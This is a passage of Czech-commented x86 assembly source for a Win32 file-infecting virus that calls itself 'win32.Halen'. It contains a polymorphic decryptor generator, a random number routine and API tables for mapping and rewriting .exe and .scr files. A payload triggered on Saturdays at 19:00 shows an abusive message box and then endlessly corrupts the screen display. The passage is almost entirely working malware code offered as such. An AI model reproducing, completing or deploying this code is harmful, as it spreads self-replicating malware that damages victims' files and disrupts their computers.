;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                    GENEROVANI DAT PRO DE/ENCRYPT RUTINY                    €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 BuildCryptData:
             mov byte ptr [ebp+offset CryptNr],0     ;Nuluj fsechna pocitadla!!! ;)
             mov byte ptr [ebp+offset CryptSize],0   ;
             call [ebp+offset GetTickCountVA]        ;Init nahodnejch cisel
             xor eax,65432h                          ;
             mov [ebp+offset RandomNr],eax           ;
             call Random                             ;Furt init
             lea edi,[ebp+offset CryptData]          ;EDI=pocatek pole crypt dat
             mov eax,4h                              ;Vygeneruj nahodny cislo
             call Random                             ;mensi nez EAX
             mov ebx,eax                             ;EBX=EAX (pracovni registr)
             mov eax,87h                             ;Instrukce XCHG EAX,prac.reg.
             stosb                                   ;
             mov eax,0c0h                            ;
             add eax,ebx                             ;
             stosb                                   ;Az sem
             mov eax,100                             ;Zvol nahodnou delku rutiny
             call Random                             ;
             mov [ebp+offset CDRandom],eax           ;a uloz ji
   BCD00:                                            ;
             mov eax,6h                              ;Nahodne zvol instrukci
             call Random                             ;
             cmp eax,0                               ;Je to XCHG ?
             jnz BCD01                               ;Ne -> jdi dal
             mov eax,87h                             ;
             stosb                                   ;Uloz 1. byte (87h)
             mov eax,4h                              ;Musime zmenit prac. registr
             call Random                             ;Nahodne zvolime
             push eax                                ;Uschovat
             mov ecx,8                               ;
             mul ecx                                 ;EAX=EAX*8
             add eax,0C0h                            ;
             add eax,ebx                             ;Plus puvodni
             pop ebx                                 ;EBX=novy prac. registr
             stosb                                   ;Uloz vypocitanou hodnotu (decrypt)
             stosb                                   ;Pro encrypt je stejna
             mov eax,90h                             ;
             stosb                                   ;Dopln na 3 bytovou instrukci (NOP)
             add byte ptr [ebp+offset CryptSize],3h  ;Zvys pocitadlo
             jmp BCD04                               ;
   BCD01:                                            ;
             cmp eax,3h                              ;Je to ADD, SUB nebo XOR?
             ja BCD03                                ;Ne -> jdi dal
             push eax                                ;Schovat
             mov eax,3h                              ;
             call Random                             ;Zvol zpusob operace
             mov ecx,eax                             ;Schovat do ECX !!!!!
             add eax,81h                             ;Pricti zaklad
             stosb                                   ;Uloz 1. byte instrukce
             pop eax                                 ;Obnovit EAX (typ instrukce)
             dec eax                                 ;-1
             jz BCD05                                ;Je to ADD?
             std                                     ;Ne -> STD
             cmp eax,2                               ;Je to XOR?
             jne BCD06                               ;Ne -> jdi dal
      BCD05: cld                                     ;Pro XOR nebo ADD
      BCD06:
             lea esi,[ebp+offset ASXInstr]           ;ESI=tabulka zakladu registru
             add esi,eax                             ;ESI=ESI+typ instrukce (0 az 2)
             lodsb                                   ;Natahni pro decrypt
             xchg eax,edx                            ;EDX<->EAX
             lodsb                                   ;Natahni pro encrypt
             cld                                     ;Vrat zpet smer
             add eax,ebx                             ;Prictem prac. reg.
             stosb                                   ;Ulozime pro decrypt
             xchg eax,edx                            ;EDX<->EAX ;)
             add eax,ebx                             ;Prictem prac. reg.
             stosb                                   ;Ulozime pro encrypt
             add byte ptr [ebp+offset CryptSize],3h  ;Zvys pocitadlo
             test ecx,ecx                            ;Je to 6 bytova instr. (ECX viz nahore)
             jnz BCD02                               ;Ne -> preskoc
             mov eax,0FFFFFFFFh                      ;Vygenerujem 4 bytovou hodnotu
             call Random                             ;
             stosd                                   ;A ulozime
             add byte ptr [ebp+offset CryptSize],3h  ;Zvysit pocitadlo
             jmp BCD04                               ;JMP!
   BCD02:    mov eax,0100h                           ;Vygen. 1 bytovou hodnotu
             call Random                             ;
             stosb                                   ;Ulozit
             jmp BCD04                               ;JMP! :)
        ASXInstr: db 0C0h,0E8h,0F0h,0F0h ;Tabula zakladu registru pro instr. ADD, SUB, XOR, XOR
   BCD03:
             push eax                                ;Instrukce ROR nebo ROL
             mov eax,2h                              ;
             call Random                             ;Nahodna hodnota
             add eax,0C0h                            ;1. byte instrukce
             stosb                                   ;Ulozit
             pop eax                                 ;Obnovit EAX (typ instrukce)
             xchg eax,ecx                            ;EAX<->ECX
             mov eax,0c0h                            ;Zaklad pro decrypt
             mov edx,0c8h                            ;Zaklad pro encrypt
             add eax,ebx                             ;+ prac. reg.
             add edx,ebx                             ;+ prac. reg.
             sub ecx,4                               ;ECX-4
             jz BCD07                                ;Je to ROL?
             xchg eax,edx                            ;Ne -> prohod EAX<->EDX
     BCD07:  stosb                                   ;Uloz hodnotu pro decrypt
             xchg eax,edx                            ;EAX<->EDX
             stosb                                   ;Uloz hodnotu pro encrypt
             mov eax,100h                            ;
             call Random                             ;Nahodna hodnota
             stosb                                   ;Ulozit
             add byte ptr [ebp+offset CryptSize],3h  ;Zvys pocitadlo
   BCD04:                                            ;
             inc byte ptr [ebp+offset CryptNr]       ;Zvys pocitadlo poctu instrukci
             lea eax,[ebp+offset CryptData+212]      ;EAX=maximalni delka instrukci
             sub eax,[ebp+offset CDRandom]           ;Odecteme (vygenerovano vyse)
             cmp edi,eax                             ;Jsme na konci?
             jb BCD00                                ;Ne -> vygeneruj dalsi instrukci
             mov eax,87h                             ;Konec -> umistime XCHG
             stosb                                   ;1. byte
             mov eax,8h                              ;
             mul ebx                                 ;EAX=EAX*prac.reg.
             add eax,0c0h                            ;EAX+0C0h
             stosb                                   ;Ulozit
             ret                                     ;Hotovo!
   CDRandom: dd ?

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€               GENEROVANI NAHODNYCH CISEL - VERY STUPID CODE                €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
  Random:                                            ;Tohle je generator nah. cisel
             push edx                                ;Je tak debilni, ze to ani nebudu
             push ecx                                ;komentovat
             xchg eax,ecx                            ;Vstup: EAX=cislo
             mov eax,[ebp+offset RandomNr]           ;Vystup: EAX=nah. cislo mensi nez
             mov edx,87654321h                       ;        vstupni EAX a vetsi nez 0
             mul edx                                 ;
             xor eax,12345678h                       ;
             mov [ebp+offset RandomNr],eax           ;
             mov edx,eax                             ;
             rol edx,8                               ;
             push eax                                ;
             jmp Rnd01                               ;
     Rnd00:  pop eax                                 ;
             shr eax,1                               ;
             shr edx,1                               ;
             xor eax,edx                             ;
             push eax                                ;
             and eax,edx                             ;
             test eax,eax                            ;
             jz Rnd01                                ;
             dec eax                                 ;
     Rnd01:  cmp eax,ecx                             ;
             jae Rnd00                               ;
             pop ecx                                 ;
             pop ecx                                 ;
             pop edx                                 ;
             ret                                     ;Hotovo!

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                          !!!!!!!!! PAYLOAD !!!!!!!!                        €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
    PayLoad:                                         ;Payload (moje oblibena cast)
             lea eax,[ebp+offset FSearch]            ;Data budeme ukladat do Search recordu
             push eax                                ;protoze uz ho nepotrebujem
             push eax                                ;
             call [ebp+offset GetSystemTimeVA]       ;Zjistime systemovy cas
             pop esi                                 ;ESI=VA FSearch
             cmp word ptr [esi+4],06                 ;Sobota?
             jne NoPL                                ;Ne -> :(
             cmp word ptr [esi+8],19                 ;19 hod. ?
             jne NoPL                                ;Ne -> :(
             lea eax,[ebp+offset gdi]                ;
             push eax                                ;VA jmena knihovny
             call [ebp+offset LoadLibraryAVA]        ;Natahneme knihovnu gdi32.dll
             xchg eax,edx                            ;EDX=VA knihovny v pameti
             lea esi,[ebp+offset BitBltS]            ;ESI=VA prvniho API nazvu
             call FindPLAPIs                         ;Najdi adresu API funkci
             lea eax,[ebp+offset user32]             ;VA jmena knihovny
             push eax                                ;
             call [ebp+offset LoadLibraryAVA]        ;Natahni knihovnu user32.dll
             xchg eax,edx                            ;EDX=VA knihovny
             lea esi,[ebp+offset MsgBoxAS]           ;
             call FindPLAPIs                         ;Najdem API adresy
             push 1000h                              ;Typ okna
             lea eax,[ebp+offset plTitle]            ;
             push eax                                ;Titulek okna
             lea eax,[ebp+offset plText]             ;
             push eax                                ;Text okna
             push 0h                                 ;Vzdy 0h
             call [ebp+offset MsgBoxAVA]             ;Ukaz Dialog
             push 0h                                 ;
             call [ebp+offset GetDCVA]               ;Handle obrazovky
             xchg eax,edx                            ;EDX=Handle
     PLSt:   xor ebx,ebx                             ;EBX=0h (radek)
             mov ecx,0000FFh                         ;Cervena barva
     PL00:   call SetPix                             ;Nastav pixel
             inc ebx                                 ;Na dalsi radek
             dec ecx                                 ;Zmen barvu (od cervene k cerne)
             jnz PL00                                ;Cerna?
     PL01:   call SetPix                             ;Nastav pixel
             inc ebx                                 ;Dalsi radek
             cmp ebx,800h                            ;Konec obrazovky?
             jne PL01                                ;Ne -> opakuj
             xor ebx,ebx                             ;
     PL02:   xor eax,eax                             ;Sloupec 0
             mov ebx,1                               ;Na sloupec 1
             push edx                                ;Uschovat handle
             call MoveScr                            ;Posun obrazovku
             pop edx                                 ;Obnov handle
             jmp PLSt                                ;Opakuj do zblbnuti!
     NoPL:   ret                                     ;Navrat (spatny datum/cas)

    FindPLAPIs:
             xor eax,eax                             ;EAX=0 ;)
             lodsb                                   ;AL=delka nazvu API funkce
             cmp al,0h                               ;Konec seznamu?
             je FPLAOK                               ;yo -> hotovka
             push eax                                ;Uschovat
             push edx                                ;
             push esi                                ;VA nazvu
             push edx                                ;VA modulu (knihovny)
             call [ebp+offset GetProcAddressVA]      ;Zjisti VA API
             pop edx                                 ;Obnov vsechno
             pop ebx                                 ;
             add esi,ebx                             ;Posunout za nazev
             mov edi,esi                             ;EDI=ESI
             stosd                                   ;Ulozit VA
             mov esi,edi                             ;ESI=EDI
             jmp FindPLAPIs                          ;Opakuj pro dalsi nazev
     FPLAOK: ret                                     ;Hotovo!
     
    MoveScr: push ebx                                ;Uschovat EBX
             push  00CC0020h                         ;Zpusob kopirovani
             push 0h                                 ;Radek odkud
             push eax                                ;Sloupec odkud
             push  edx                               ;Handle odkud
             push  800h                              ;Vyska
             push  800h                              ;Sirka
             push 0h                                 ;Handle kam
             push ebx                                ;Radek kam
             push  edx                               ;Sloupec kam
             call [ebp+offset BitBltVA]              ;Posun ten kus obrazu!
             pop ebx                                 ;Obnovit
             ret                                     ;Zpet!

     SetPix: push ecx                                ;Uschovat souradnice
             push edx                                ;
             push ecx                                ;Barva
             push ebx                                ;Radek
             push 0h                                 ;Sloupec
             push edx                                ;Handle
             call [ebp+offset SetPixelVA]            ;Nastav pixel
             pop edx                                 ;Obnov souradnice
             pop ecx                                 ;
             ret                                     ;Hotovo!

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                                   DATA                                     €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 plTitle      db 'win32.Halen',0h
  plText       db '..::|| Your system was fucked by win32.Halen. Written by pxR[MIONS] ||::..',0h

 CryptSize db ?
 CryptNr   db ?
 RandomNr:  dd ?
 DecryptStart: db 0e8h,0h,0h,0h,0h,05fh,081h,0c7h,08bh,0f7h,033h,0edh,0fch,0adh
 DecryptEnd: db 0abh,45h,081h,0FDh,0fh,85h,00,00,00,00

 VirSize equ offset VirusEnd-offset Start+1
 DataSize equ offset VirusEnd-offset CodeEnd+1
 
 if debug
    testFName db 'test.exe',0h
 endif
 
 exeMask db '*.exe',0h
 scrMask db '*.scr',0h
 origIP dd ?
 
 APITableStr:
       GetFileAttributesAS    db 19,'GetFileAttributesA',0h
       SetFileAttributesAS    db 19,'SetFileAttributesA',0h
       CreateFileAS           db 12,'CreateFileA',0h
       GetFileTimeS           db 12,'GetFileTime',0h
       CreateFileMappingAS    db 19,'CreateFileMappingA',0h
       MapViewOfFileS         db 14,'MapViewOfFile',0h
       UnmapViewOfFileS       db 16,'UnmapViewOfFile',0h
       CloseHandleS           db 12,'CloseHandle',0h
       SetFilePointerS        db 15,'SetFilePointer',0h
       SetEndOfFileS          db 13,'SetEndOfFile',0h
       SetFileTimeS           db 12,'SetFileTime',0h
       ExitProcessS           db 12,'ExitProcess',0h
       FindFirstFileAS        db 15,'FindFirstFileA',0h
       FindNextFileAS         db 14,'FindNextFileA',0h
       GetWindowsDirectoryAS  db 21,'GetWindowsDirectoryA',0
       GetSystemDirectoryAS   db 20,'GetSystemDirectoryA',0
       GetCurrentDirectoryAS  db 21,'GetCurrentDirectoryA',0
       SetCurrentDirectoryAS  db 21,'SetCurrentDirectoryA',0
       GetTickCountS          db 13,'GetTickCount',0
       LoadLibraryAS          db 13,'LoadLibraryA',0
       GetSystemTimeS         db 14,'GetSystemTime',0
       GetProcAddressS        db 15,'GetProcAddress',0
                              db 0h

 gdi:         db 'gdi32.dll',0h
 user32:      db 'user32.dll',0h
 BitBltS      db 7,'BitBlt',0h
 BitBltVA     dd ?
 SetPixelS    db 9,'SetPixel',0h
 SetPixelVA   dd ?
              db 0h
 MsgBoxAS     db 12,'MessageBoxA',0h
 MsgBoxAVA    dd ?
 GetDCS       db 6,'GetDC',0h
 GetDCVA      dd ?
              db 0h

                              db 0h,0h,0h,0h

 CodeEnd:
;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€          KONEC KODU NASLEDUJICI DATA SE UZ NEKOPIRUJI S TELEM VIRU         €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 
  CryptData  db 214 dup (0h)

 APITableVA:
       GetFileAttributesAVA   dd ?
       SetFileAttributesAVA   dd ?
       CreateFileAVA          dd ?
       GetFileTimeVA          dd ?
       CreateFileMappingAVA   dd ?
       MapViewOfFileVA        dd ?
       UnmapViewOfFileVA      dd ?
       CloseHandleVA          dd ?
       SetFilePointerVA       dd ?
       SetEndOfFileVA         dd ?
       SetFileTimeVA          dd ?
       ExitProcessVA          dd ?
       FindFirstFileAVA       dd ?
       FindNextFileAVA        dd ?
       GetWindowsDirectoryAVA dd ?
       GetSystemDirectoryAVA  dd ?
       GetCurrentDirectoryAVA dd ?
       SetCurrentDirectoryAVA dd ?
       GetTickCountVA         dd ?
       LoadLibraryAVA         dd ?
       GetSystemTimeVA        dd ?
       GetProcAddressVA       dd ?
       
 K32VA:      dd ?
 K32EAT:     dd ?
 K32ENPT:    dd ?
 K32EO:      dd ?
 K32EOMax:   dd ?
 
 fileAlign dd ?
 infCounter db ?
  
 mapMem dd ?
 mapView dd ?
 IMHandle dd ?
 IFHandle dd ?
 origDir db 128h dup (?)
 currDir db 128h dup (?)
 
 FileTime STRUC
        LDateTime  dd ?
        HDateTime  dd ?
 FileTime ENDS

 FSearchData STRUC
        FAttr      dd ?
        CrTime     FileTime ?
        LAcTime    FileTime ?
        LWrTime    FileTime ?
        FSizeH     dd ?
        FSizeL     dd ?
        Res0       dd ?
        Res1       dd ?
        FName      db 260 dup (?)
        AlFName    db 16 dup (?)                  
 FSearchData ENDS
 
 FSearch FSearchData ?
 
 
;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                       DIALOG BOX PRO 1. GENERACI VIRU                      €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
 VirusEnd:
             push 0h                                 ;First generation only!
             push offset FGTitle
             push offset FGMessage
             push 0h
             call MessageBoxA
             push 0h
             call ExitProcess

end Start

;€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
;€                              A TO JE VSE PRATELE                           €
;€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
